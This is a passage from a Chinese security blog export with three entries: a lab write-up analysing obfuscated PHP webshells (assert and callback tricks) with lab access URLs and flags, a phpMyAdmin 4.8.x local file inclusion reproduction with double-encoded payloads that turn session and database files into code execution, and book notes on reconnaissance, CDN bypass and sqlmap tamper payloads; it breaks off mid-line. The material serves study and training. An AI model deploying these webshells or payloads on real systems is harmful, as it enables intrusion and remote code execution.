alt=""></p><pre><code class="php">&lt;?phperror_reporting(0);$e = $_REQUEST[&#39;e&#39;];$arr = array($_POST[&#39;POST&#39;],);array_map(base64_decode($e), $arr);?&gt;</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281739_94.png" alt=""></p><p>构造参数e为经过base64加密后的assert字符串，这样传递过去的assert()，就会对arr数组中的每一个值进行作用，数组中的每一个值进行作用。</p><p>所以整理后：<code>base64_decode($_REQUEST[&#39;e&#39;])($_POST[&#39;POST&#39;]);</code></p><p><a href="http://219.153.49.228:45692/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0" target="_blank" rel="external">http://219.153.49.228:45692/www/Assets/upload/pic3.jpg.php?e=YXNzZXJ0</a> 密码 POST</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281744_739.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281743_719.png" alt=""></p><p>mozhea53e1e65c45eae8bbabfca9d30c</p><h3 id="0x06-第七题"><a href="#0x06-第七题" class="headerlink" title="0x06 第七题"></a>0x06 第七题</h3><h4 id="背景-9"><a href="#背景-9" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281749_36.png" alt=""></p><p> 下载系统源码，在random_int.php存在恶意代码</p><pre><code class="php">&lt;?phperror_reporting(0);$e = $_REQUEST[&#39;e&#39;];$arr = array(&#39;test&#39;, $_REQUEST[&#39;POST&#39;]);uasort($arr, base64_decode($e));</code></pre><p>这里分析一下webshell代码：</p><p>uasort: </p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282045_325.png" alt=""></p><pre><code>通过base64_decode()函数解密后的函数，对$数组进行排序，通过查看arr数组进行排序，通过查看$arr数组可知，其含有$元素，这里可以知道使用可执行函数，对_REQUEST[&#39;POST&#39;]元素，这里可以知道使用可执行函数，对$arr进行排序时，可执行shell代码。所以shell代码如下：base64_decode($_REQUEST[&#39;e&#39;])$_REQUEST[&#39;POST&#39;];</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809281754_26.png" alt=""></p><p>mozhe24bcc5751c5d95d68250bfc8771</p><h3 id="0x07-第八题"><a href="#0x07-第八题" class="headerlink" title="0x07 第八题"></a>0x07 第八题</h3><h4 id="背景-10"><a href="#背景-10" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282050_403.png" alt=""></p><p> 下载系统源码，在\fields\class-wp-rest-comment-meta-style.php存在恶意代码</p><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282056_478.png" alt=""></p><pre><code class="php">$e = $_REQUEST[&#39;e&#39;];$arr = array($_POST[&#39;pass&#39;] =&gt; &#39;|.*|e&#39;,);array_walk($arr, $e, &#39;&#39;);</code></pre><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282103_450.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282111_382.png" alt=""></p><p> preg_replace() 将 replacement 参数当作 PHP 代码，正则意思为匹配模式出现/e修正符，后面的replacement就会被当作php代码执行，这样我们就可以把 <code>$_POST[&#39;pass&#39;]</code>运行。</p><p><a href="http://219.153.49.228:40515//www/fields/class-wp-rest-comment-meta-style.php?" target="_blank" rel="external">http://219.153.49.228:40515//www/fields/class-wp-rest-comment-meta-style.php?</a> e=preg_replace 密码为pass</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282102_497.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282058_846.png" alt=""></p><p>mozhe43997bb5d7b5b3546758a4724a2</p><h3 id="0x08-第九题"><a href="#0x08-第九题" class="headerlink" title="0x08 第九题"></a>0x08 第九题</h3><h4 id="背景-11"><a href="#背景-11" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p> 下载系统源码，在\pomo\no.php存在恶意代码</p><pre><code class="php">error_reporting(0);$e = $_REQUEST[&#39;e&#39;];//接收e参数数据register_shutdown_function($e, $_REQUEST[&#39;REQUEST&#39;]); //e传入的assert和Request传入内容作用</code></pre><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282121_797.png" alt=""></p><p>这里分析一下webshell代码：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282122_206.png" alt=""></p><p>PHP中止的情况有三种：</p><ul><li><ul><li>执行完成<ul><li>exit/die导致的中止</li><li>发生致命错误中止    </li></ul></li></ul></li></ul><p>等到php函数执行完成，就会调用我们传进去的php中止时执行的函数，构成 <code>assert($_REQUEST[&#39;REQUEST&#39;])</code> ，一句话木马</p><p><a href="http://219.153.49.228:41312/www/pomo/no.php?e=assert" target="_blank" rel="external">http://219.153.49.228:41312/www/pomo/no.php?e=assert</a></p><p>密码：REQUEST</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282326_573.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282326_19.png" alt=""></p><p>mozhe4694154a7d928a98d6db8a0b267</p><h3 id="0x09-第十题"><a href="#0x09-第十题" class="headerlink" title="0x09 第十题"></a>0x09 第十题</h3><h4 id="背景-12"><a href="#背景-12" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282338_522.png" alt=""></p><p> 下载系统源码，在\hack\static\css.php存在恶意代码</p><pre><code class="php">&lt;?php error_reporting(0); $e = $_REQUEST[&#39;e&#39;]; declare(ticks=1); register_tick_function ($e, $_REQUEST[&#39;GET&#39;]); ?&gt;</code></pre><p>D盾扫描验证</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282337_894.png" alt=""></p><p>这里分析一下webshell代码：</p><p>register_tick_function函数必须要和declare流程控制机制合并使用,</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282345_79.png" alt=""></p><p>每执行ticks=1行php代码，就执行一次register_tick_function函数中的代码，当e接收assert时就构成了，<code>$_request[&#39;GET&#39;]</code>是参数，这样就构成了<code>assert($_request[&#39;GET&#39;])</code> </p><p><a href="http://219.153.49.228:40102//www/hack/static/css.php?e=assert" target="_blank" rel="external">http://219.153.49.228:40102//www/hack/static/css.php?e=assert</a> 密码:GET</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282340_126.png" alt=""></p><p>mozhe27968c88c7b957576fe9562274e</p><h3 id="0x0a-第十一题"><a href="#0x0a-第十一题" class="headerlink" title="0x0a 第十一题"></a>0x0a 第十一题</h3><h4 id="背景-13"><a href="#背景-13" class="headerlink" title="背景"></a>背景</h4><p>黑客利用漏洞攻击了单位的业务系统，上传和篡改了文件，找到黑客的踪迹。</p><h4 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h4><p>访问</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809282350_310.png" alt=""></p><p> 下载系统源码，在mysql_conn.php存在恶意代码</p><pre><code class="php">&lt;?php if(!empty($_GET[1]) &amp;&amp; $_GET[1]==&#39;GET.fPZ87&#39;){    $_=@fopen(&#39;t.php&#39;, &#39;a&#39;);    @fwrite($_,&quot;&lt;?php \$_=str_replace(&#39;ilo&#39;,&#39;ass&#39;,str_replace(&#39;vey&#39;,&#39;ert&#39;,\$_GET[2]));@\$_(\$_POST[1]);?&gt;&quot;);    @fclose($_);}?&gt;</code></pre><p>这里分析一下webshell代码：</p><p>若get到的1不为空且1=GET.fPZ87的话执行，创建t.php并写入，写入t.php恶意代码，<code>$GET_[2]</code>接收到的值中的vey替换为ert，ilo替换为ass，也是时候当2=ilovey是，构成assert($_POST[1])，密码为1的一句话。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290908_564.png" alt=""></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201809290007_111.png" alt=""></p><p>mozhef880344b9cbe7323d3ef241d16a</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>phpMyAdmin 4.8.x 本地文件包含</title>
      <link href="/archis/767136e1/"/>
      <url>/archis/767136e1/</url>
      
        <content type="html"><![CDATA[<h2 id="0x00-源码分析"><a href="#0x00-源码分析" class="headerlink" title="0x00 源码分析"></a>0x00 源码分析</h2><p>在/index.php     56行：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/f21383d8fef7c3ed9de41992dab112e2.png" alt="img"></p><p>这里的target 可以直接传值输入。我们可以传入一个本地文件路径去让其包含，就会造成LFI漏洞。</p><p>首先，我们满足4个条件：</p><p>1．传入的target 需要是一个字符串。</p><p>2．不能以/index/ 开头。</p><p>3．不能在$target_blacklist数组内。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/052347bd2743c4b4c356996d842359de.png" alt="img"></p><p>4．满足checkPageValidity函数要求。</p><p>跟踪一下checkPageValidity函数</p><p>在/libraries/classes/Core.php  443行:</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/715e352918c11a7e8029bb2d9a897fe6.png" alt="img"></p><p>该函数内，有三处返回ture的地方，只要有任意一处返回ture就可以。观察这三处，有一个共同点，都是需要$page在$whitelist数组中内才会返回true。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/84f51699726302cc72be152d425b380b.png" alt="img"></p><p>我们先看第一个返回true的地方。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/bae25cd9638b29f7e362378fd4bffd41.png" alt="img"></p><p>这里的<code>`$page</code>在in_array之前没有经过任何的修饰，直接就与$whitelist作比较。没有办法绕过，传入的target值只能为白名单里的文件名才行。很明显，第一个并不能利用。</p><p>再来看第二个</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/7b3e77822c7d3ac4142d3725aaa69bb8.png" alt="img"></p><p>先介绍下这些函数的作用：</p><p>mb_strpos()函数的意思是查找字符串在另一个字符串中首次出现的位置。</p><p>mb_substr()函数的意思是：</p><pre><code>string mb_substr ( string $str, int $start [, int $length = NULL [, string $encoding = mb_internal_encoding()]] )</code></pre><p>从$str字符串中，提取从$start位置开始，长度为$length的字符串。</p><p>可以看出，第二个可以返回ture，我们利用db_sql.php?/../../格式就可以达到目的，绕过白名单限制。那是不是这样就可以造成漏洞了呢？</p><p>假设我们用db_sql.php?/../../../aaa.txt来绕过白名单限制进行包含文件。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/7c62ac55d4b22ce97d63800033f14835.png" alt="img"></p><p>那这里就是 include ‘db_sql.php?/../../../aaa.txt’。</p><p>这种格式并不能跨路径包含，因为php程序把？号后面的东西当成是传入db_sql.php文件的参数。</p><p>再来看第三个：</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/84beb310c9f8c555ea6fb71e0698f371.png" alt="img"></p><p>第三个和第二个对比多出了个urldecode()函数。</p><p>而问题恰恰出在了这个urldecode()函数。</p><p>我们可以利用双重编码绕过，将?经过两次编码%253f就可以绕过白名单验证。</p><p>原因是：</p><p>%253f 传入时，首先会被自动解码一次，变成%3f。然后urldecode()再解码一次，就变成了 ?。 成功绕过了白名单限制。</p><p>这种情况下include的包含情况就是这样的，也就可以任意包含本地文件了。</p><h2 id="0x01-漏洞复现"><a href="#0x01-漏洞复现" class="headerlink" title="0x01 漏洞复现"></a>0x01 漏洞复现</h2><p>1.使用帐号 root ，密码 toor 登录 phpMyAdmin</p><p>2.点击顶部导航栏中的SQL按钮，执行SQL查询</p><pre><code class="sql">select &#39;&lt;?php phpinfo();exit;?&gt;&#39;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_5.png" alt="VulnSpy"></p><ol><li>获取自己的SESSION ID</li></ol><p>你的 SESSION ID 为 Cookie 中的 <code>phpMyAdmin</code> 项。</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_6.png" alt="VulnSpy"></p><p>这样对应的SESSION文件为<code>/var/lib/php/sessions/sess_你的SESSION ID</code>。</p><ol><li>包含SESSION文件，成功利用该漏洞</li></ol><pre><code class="bash">http://1a23009a9c9e959d9c70932bb9f634eb.vsplate.me/index.php?target=db_sql.php%253f/../../../../../../../../var/lib/php/sessions/sess_11njnj4253qq93vjm9q93nvc7p2lq82k</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/exp_7.png" alt="VulnSpy"></p><h2 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h2><p>将WebShell写入到数据库中然后包含数据库文件，这个方法需要写入数据的权限。</p><p>在phpmyadmin中插入马的字段。比如 <code>&lt;?php eval($_GET[a])?&gt;</code></p><p>此时，如果mysql的路径被猜到的话，其实是可以知道该表中所存储的数据的。</p><pre><code class="vim">?a=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../var/lib/mysql/test/HACK.ibd</code></pre><p>我不知道应该是ibd还是frm文件，但是最终发现这样会出错，猜测可能是字符编码的问题或者是mysql版本的问题。我mysql的版本比较高。可能数据文件不是这么好读取。</p><p>方法二：利用mysql的data文件：</p><p>不用写文件也能拿Shell的方法。</p><p>我们都知道，登入phpmyadmin后，数据库就是完全可以控制的了，那我们是否可以把WebShell写入到数据库中然后包含数据库文件</p><p>创建一个名为abc的表，并且字段设置为</p><pre><code>&lt;?php eval($_GET[‘z’]); ?&gt;。</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/0b17b8f7210a3d7894dca01435cfe609.png" alt="img"></p><p>保存，然后会在\MySQL\data\test目录下生成三个以数据表名命名的文件。（test为数据库名称）。</p><p>如果你不知道data文件路径，可以用sql查询来获取到它的绝对路径。</p><pre><code>show variables like &#39;%datadir%&#39;;</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/b071d225a03774b04f057f324a390a17.png" alt="img"></p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/2101ec2bbe439ab48a8ac574c16e189e.png" alt="img"></p><p>其中，abc.frm文件内容</p><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/2debae539b0d4aea4aef11dddf6af7b0.png" alt="img"></p><p>Payload：</p><pre><code>/index.php?z=phpinfo();&amp;target=db_sql.php%253f/../../../../../../../../ruanjian/phpstudy/PHPTutorial/MySQL/data/test/abc.frm</code></pre><p><img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/bebfd31b0d63a338eee12cda98393928.png" alt="img"></p><p>方法三：包含本地系统文件</p><p>Payload:</p><pre><code>/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini</code></pre><h2 id="漏洞细节"><a href="#漏洞细节" class="headerlink" title="漏洞细节"></a>漏洞细节</h2><p>参照ChaMd5安全团队发布的文章：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&amp;mid=2247485036&amp;idx=1&amp;sn=8e9647906c5d94f72564dec5bc51a2ab&amp;chksm=e89e2eb4dfe9a7a28bff2efebb5b2723782dab660acff074c3f18c9e7dca924abdf3da618fb4&amp;mpshare=1&amp;scene=1&amp;srcid=0621gAv1FMtrgoahD01psMZr&amp;pass_ticket=LqhRfckPxAVG2dF%2FjxV%2F9%2FcEb5pShRgewJe%2FttJn2gIlIyGF%2FbsgGmzcbsV%2BLmMK#rd" target="_blank" rel="external">phpmyadmin4.8.1后台getshell</a></p>]]></content>
      
      
      <categories>
          
          <category> WebSecurity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 复现 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>《Web安全攻防-渗透测试实战指南》读书笔记</title>
      <link href="/archis/924987ad/"/>
      <url>/archis/924987ad/</url>
      
        <content type="html"><![CDATA[<p>本文首发于<a href="https://bbs.ichunqiu.com/forum.php?mod=viewthread&amp;tid=45429&amp;highlight=%E3%80%8AWeb%E5%AE%89%E5%85%A8%E6%94%BB%E9%98%B2-%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95%E5%AE%9E%E6%88%98%E6%8C%87%E5%8D%97%E3%80%8B%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0" target="_blank" rel="external">i春秋</a>，转载请注明来源</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>本文记录书中一些不甚熟悉以及其他扩展的技巧tips，欢迎纠错和交流。</p><h2 id="第1章-渗透测试之信息收集"><a href="#第1章-渗透测试之信息收集" class="headerlink" title="第1章 渗透测试之信息收集"></a><strong>第1章 渗透测试之信息收集</strong></h2><p>进行渗透测试之前，最重要的一步就是信息收集，在这个阶段，我们要尽可能地收集目标的信息。所谓“知己知彼，百战不殆”，我们越是了解测试目标，测试的工作就越是容易。本章主要介绍了域名及子域名信息收集﹑查找真实IP﹑CMS指纹识别﹑目标网站真实IP﹑常用端口的信息收集等。</p><h3 id="域名信息"><a href="#域名信息" class="headerlink" title="域名信息"></a>域名信息</h3><p>nslookup</p><p>whois</p><p>天眼查</p><h3 id="敏感信息"><a href="#敏感信息" class="headerlink" title="敏感信息"></a>敏感信息</h3><p>谷歌语法</p><p>看burpsuite的response包</p><h3 id="子域名"><a href="#子域名" class="headerlink" title="子域名"></a>子域名</h3><p><a href="https://dnsdumpster.com/、在线dns侦查、" target="_blank" rel="external">https://dnsdumpster.com/、在线dns侦查、</a></p><h3 id="指纹识别"><a href="#指纹识别" class="headerlink" title="指纹识别"></a>指纹识别</h3><p>工具：御剑web指纹识别，what web，webrobo，椰树，轻量web指纹识别，</p><p>在线网站：<a href="http://tools.bugscaner.com/" target="_blank" rel="external">Bugscaner</a>、<a href="http://www.yunsee.cn/" target="_blank" rel="external">云悉指纹</a>、<a href="https://www.whatweb.net/" target="_blank" rel="external">whatweb</a></p><h3 id="查找真实ip"><a href="#查找真实ip" class="headerlink" title="查找真实ip"></a>查找真实ip</h3><p>不存在cdn：<a href="http://www.ip138.com/" target="_blank" rel="external">http://www.ip138.com/</a></p><p>cdn：先用<a href="https://www.17ce.com/多地区ping" target="_blank" rel="external">https://www.17ce.com/多地区ping</a></p><p>绕过方式：</p><ul><li><p>内部邮箱源，ping邮件服务器的域名</p></li><li><p>扫描测试文件 phpinfo</p></li><li><p>分站域名： 主站挂cdn，分站未挂，二级域名突破口</p></li><li><p>国外访问：国内的cdn只针对国内用户访问加速，国外不一定 通过国外在线代理网站：<a href="https://asm.ca.com/en/ping.php" target="_blank" rel="external">https://asm.ca.com/en/ping.php</a></p></li><li><p>查询域名解析记录。<a href="https://www.netcraft.com/" target="_blank" rel="external">https://www.netcraft.com/</a></p></li><li><p>网站有app，burpsuit抓包</p></li><li><p>绕过CloudFlare CDN查找真实IP。CloudFlare Watch</p></li><li><p>用 Zmap 扫全网</p><p>  『我们首先从 apnic 获取 IP 段，然后使用 Zmap 的 banner-grab 扫描出来 80 端口开放的主机进行 banner 抓取，最后在 http-req 中的 Host 写 xiaix.me』（其中xiaix.me是需要寻找真实IP的域名）。说到这个，我就想起了shodan，zoomeye。虽然他们都很强大地能够搜索到全球的IP banner信息，http的banner信息，但是却不能搜索网页代码。</p><p>  有没有一种搜索可以搜索网页标题、内容的方法，这样，我就能找到哪写服务器上运行的网站是与我要找的一致，就能找出真实的服务器IP。在圈子里混，朋友推荐一个新的IOT搜索引擎，跟前面提到的两个相似，叫fofa，WWW.FOFA.SO。这个东西优点是支持HTML源代码检索。</p><p>  举例：找到www.5173.com的真实IP</p><p>  使用ping命令，返回信息有『49k6959vz6ea10u8.alicloudsec.com (218.11.3.155)』，这及时试用了某CDN服务的信号。</p><blockquote><p><strong>ping www.5173.com</strong><br>正在 Ping 49k6959vz6ea10u8.alicloudsec.com [218.11.3.155] 具有 32 字节的数据:<br>来自 218.11.3.155 的回复: 字节=32 时间=34ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=36ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=32ms TTL=33<br>来自 218.11.3.155 的回复: 字节=32 时间=31ms TTL=33</p><p>218.11.3.155 的 Ping 统计信息:</p><pre><code>数据包: 已发送 = 4，已接收 = 4，丢失 = 0 (0% 丢失)，</code></pre><p>往返行程的估计时间(以毫秒为单位):</p><pre><code>最短 = 31ms，最长 = 36ms，平均 = 33ms</code></pre></blockquote><p>  访问www.5173.com，源代码内显示标题有很特别的内容『网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com』，包含有根域名5173.com，这种title是非常特殊的，用来检索，就能找到WWW.5173.COM的真实IP</p><p>  查看www.5173.com的标题</p><p>  将这个标题内容作为关键词搜索，使用语法『title=”网络游戏交易平台|手游交易|装备交易|游戏币交易|帐号交易|点卡充值|代练服务-是国内最权威最安全的游戏交易平台-5173.com”』</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252056_937.png" alt=""></p><p>  在FOFA上搜索到3个网站包含指定标题</p><p>  在FOFA上搜索到www.5173.com的IP</p><p>  最后，访问<a href="http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155" target="_blank" rel="external">http://218.11.3.155，如果网站可以打开，内容与www.5173.com是一致的，那么这就是真实IP；如果网站不可以打开，有可能这个是CDN，也有可能是一个虚拟主机服务器。使用ip==&quot;218.11.3.155</a>“</p><p>  搜索这个IP上的全部服务和网站，显示全是5173.com结尾的域名，基本确认这是真实ip，且是5173.com的主要网站服务器。</p><p>  <img src="https://blog-1254419664.cos.ap-chengdu.myqcloud.com/backup/201808252101_958.png" alt=""></p><p>  查看『218.11.3.155』上的所有网站和服务</p></li></ul><h3 id="收集敏感目录"><a href="#收集敏感目录" class="headerlink" title="收集敏感目录"></a>收集敏感目录</h3><p>spinder.py、<a href="http://www.webscan.cc/、dirbuster" target="_blank" rel="external">http://www.webscan.cc/、dirbuster</a></p><h2 id="第2章-搭建漏洞环境及实战"><a href="#第2章-搭建漏洞环境及实战" class="headerlink" title="第2章 搭建漏洞环境及实战"></a><strong>第2章 搭建漏洞环境及实战</strong></h2><p>白帽子在目标对象不知情或者没有得到授权的情况下发起的渗透攻击是非法行为，所以我们通常会搭建一个有漏洞的Web应用程序，以此来练习各种各样的安全渗透技术。本章主要介绍了Linux系统下的LANMP﹑Windows系统下的WAMP应用环境的搭建，DVWA漏洞平台﹑SQL注入平台﹑XSS测试平台等常用渗透测试漏洞练习平台的安装配置及实战。</p><h2 id="第3章-常用工具"><a href="#第3章-常用工具" class="headerlink" title="第3章 常用工具"></a><strong>第3章 常用工具</strong></h2><p>“工欲善其事，必先利其器”，在日常的渗透测试中，借助一些工具，白帽子可以更高效地执行安全测试，这能极大地提高工作的效率和成功率。本章详细介绍了黑客常用的三大神器SQLMap﹑Burp Suite﹑Nmap的安装﹑入门和实战利用，实为“居家旅行”﹑渗透测试之必备工具。</p><h3 id="sqlmap"><a href="#sqlmap" class="headerlink" title="sqlmap"></a>sqlmap</h3><p>–os-shell –os-shell 运行任意系统操作命令</p><p>sqlmap -u “url” –file-read “C:/example.exe” -v 1 从数据可服务器中读取文件</p><p>–file-write –file-dest :上传文件到数据服务器中</p><p>–identify -waf 是否有安全防护 （waf/IDS/IPS）</p><p>sqlmap tamper：</p><h3 id="使用方法："><a href="#使用方法：" class="headerlink" title="使用方法："></a>使用方法：</h3><blockquote><p>sqlmap.py XXXXX -tamper “模块名”</p></blockquote><h3 id="各个-tamper-的作用"><a href="#各个-tamper-的作用" class="headerlink" title="各个 tamper 的作用"></a>各个 tamper 的作用</h3><p>下面针对 sqlmap 自带的 tamper 做一下简单的解释。</p><h4 id="apostrophemask-py"><a href="#apostrophemask-py" class="headerlink" title="apostrophemask.py:"></a>apostrophemask.py:</h4><blockquote><p>return payload.replace(‘\’’, “%EF%BC%87”) if payload else payload</p></blockquote><p>apostrophemask.py 用UTF-8全角字符替换单引号字符 ，用于过滤了单引号的情况。</p><blockquote><p>1’ AND ‘1’=’1  <strong>to</strong>     1%EF%BC%87 AND %EF%BC%871%EF%BC%87=%EF%BC%871</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="apostrophenullencode-py"><a href="#apostrophenullencode-py" class="headerlink" title="apostrophenullencode.py:"></a>apostrophenullencode.py:</h4><blockquote><p>return payload.replace(‘\’’, “%00%27”) if payload else payload</p></blockquote><p>将单引号替换为宽字节 unicode 字符，用于过滤了单引号的情况</p><blockquote><p>1’ AND ‘1’=’1     <strong>to</strong>     1�’ AND �’1�’=�’1</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="appendnullbyte-py"><a href="#appendnullbyte-py" class="headerlink" title="appendnullbyte.py:"></a>appendnullbyte.py:</h4><blockquote><p>return “%s%%00” % payload if payload else payload</p></blockquote><p>在你构造的payload后面加一个空字符</p><blockquote><p>1’ AND ‘1’=’1    <strong>to</strong>    1’ AND ‘1’=’1[]</p></blockquote><p><strong>适用数据库：</strong>Access</p><h4 id="base64encode-py"><a href="#base64encode-py" class="headerlink" title="base64encode.py:"></a>base64encode.py:</h4><blockquote><p>return base64.b64encode(payload.encode(UNICODE_ENCODING)) if payload else payload</p></blockquote><p>这个看模块名也知道是 base64 编码</p><blockquote><p>1’ AND ‘1’=’1     <strong>to</strong>    MScgQU5EICcxJz0nMQ==</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="between-py"><a href="#between-py" class="headerlink" title="between.py:"></a>between.py:</h4><p>这个代码有点长，就不贴代码了，可以自己去查看：<code>C:\Python\SQLMap\tamper\between.py</code></p><p>将大于符号和等号用 between 语句替换，用于过滤了大于符号和等号的情况</p><blockquote><p>1 AND A &gt; B    <strong>to</strong>    1 AND A NOT BETWEEN 0 AND B</p><p>1 AND A = B    <strong>to</strong>    1 AND A BETWEEN B AND B</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="bluecoat-py"><a href="#bluecoat-py" class="headerlink" title="bluecoat.py:"></a>bluecoat.py:</h4><p>用随机的空白字符代替空格，并且将等号替换为 like ，用于过滤了空格和等号的情况</p><blockquote><p>union select <em> from users where id = 1    <strong>to</strong>    union%09select </em> from%09users where id like 1</p></blockquote><p><strong>适用数据库：</strong>MySQL 5.1, SGOS</p><h4 id="chardoubleencode-py"><a href="#chardoubleencode-py" class="headerlink" title="chardoubleencode.py:"></a>chardoubleencode.py:</h4><p>用 url 编码两次你的 payload </p><blockquote><p>select <em> from users    <em>*to</em></em>    %2573%2565%256c%2565%2563%2574%2520%252a%2520%2566%2572%256f%256d%2520%2575%2573%2565%2572</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charencode-py"><a href="#charencode-py" class="headerlink" title="charencode.py:"></a>charencode.py:</h4><p>用 url 编码一次你的 payload</p><blockquote><p>select <em> from users    <em>*to</em></em>    %73%65%6c%65%63%74%20%2a%20%66%72%6f%6d%20%75%73%65%72</p></blockquote><p><strong>适用数据库：</strong>ALL</p><h4 id="charunicodeencode-py："><a href="#charunicodeencode-py：" class="headerlink" title="charunicodeencode.py："></a>charunicodeencode.py：</h4><p>用 unicode 编码 payload ，只编码非编码字符</p><blockquote><p>select <em> from users    <em>*to</em></em>    \u0073\u0065\u006c\u0065\u0063\u0074\u0020\u002a\u0020\u0066\u0072\u006f\u006d\u0020\u0075\u0073\u0065\u0072\u0073</p></blockquote><p><strong>适用数据库：</strong>ALL，但是需要 asp 和 asp.net 环境</p><h4 id="commalesslimit-py："><a href="#commalesslimit-py：" class="headerlink" title="commalesslimit.py："></a>commalesslimit.py：</h4><p>将 payload 中的逗号用 offset 代替，用于过滤了逗号并且是两个参数的情况</p><blockquote><p>limit 2,1    <strong>to</strong>    limit 1 offset 2</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commalessmid-py："><a href="#commalessmid-py：" class="headerlink" title="commalessmid.py："></a>commalessmid.py：</h4><p>将 payload 中的逗号用 from for 代替，用于过滤了逗号并且是三参数的情况</p><blockquote><p>mid(version(), 1, 1)    <strong>to</strong>    mid(version() from 1 for 1)</p></blockquote><p><strong>适用数据库：</strong>MySQL</p><h4 id="commentbeforeparentheses-py："><a href="#commentbeforeparentheses-py：" class="headerlink" title="commentbeforeparentheses.py："></a>commentbeforeparentheses.py：</h4><blockquote><p>retVal = 